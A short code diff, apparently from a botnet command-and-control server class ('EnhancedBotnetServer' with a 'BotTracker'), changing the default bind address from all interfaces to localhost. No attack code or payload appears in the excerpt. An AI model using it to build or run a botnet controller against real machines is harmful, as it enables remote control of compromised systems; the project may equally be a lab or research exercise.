@@ -60,7 +60,7 @@ class EnhancedBotnetServer:
         self.validator = InputValidator()
         self.bot_tracker = BotTracker()
 
-        self.host = self.config.get("SERVER_HOST", "0.0.0.0")
+        self.host = self.config.get("SERVER_HOST", "127.0.0.1")
         self.port = self.config.get("SERVER_PORT", 9999)
         self.web_port = self.config.get("WEB_PORT", 8080)
         self.max_connections = self.config.get("MAX_CONNECTIONS", 100)
